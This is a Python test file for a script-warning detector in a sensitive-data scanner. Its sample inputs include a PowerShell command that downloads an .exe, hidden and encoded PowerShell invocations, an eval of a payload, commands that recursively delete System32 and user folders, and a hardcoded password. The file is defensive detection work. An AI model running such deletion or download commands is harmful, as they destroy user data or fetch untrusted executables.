from sensitive_data_scanner.detection.script_warnings import find_script_warnings


def _warnings_for(line: str) -> list[str]:
    return [match.warning_type for match in find_script_warnings(line)]


def test_detects_suspicious_download_commands() -> None:
    warnings = _warnings_for("powershell Invoke-WebRequest http://example.com/file.exe")

    assert "Suspicious Download Command" in warnings


def test_detects_hidden_and_encoded_powershell() -> None:
    assert "Suspicious Hidden PowerShell" in _warnings_for(
        "powershell.exe -WindowStyle Hidden -Command whoami"
    )
    assert "Suspicious Encoded PowerShell" in _warnings_for("powershell -enc ABC123")


def test_detects_eval_style_execution() -> None:
    assert "Suspicious Eval Execution" in _warnings_for("eval($payload)")


def test_detects_dangerous_windows_deletion_targets() -> None:
    examples = [
        "del /s /q C:\\Windows\\System32\\*",
        "rd /s /q C:\\Users",
        "del /q %USERPROFILE%\\Documents\\*",
        "rmdir %HOMEPATH%\\Downloads",
    ]

    for line in examples:
        assert "Dangerous System Deletion Command" in _warnings_for(line)


def test_does_not_warn_for_simple_file_delete() -> None:
    assert "Dangerous System Deletion Command" not in _warnings_for("del temp.txt")


def test_detects_hardcoded_credentials_in_script() -> None:
    assert "Hardcoded Credential In Script" in _warnings_for("password = SuperSecret123")
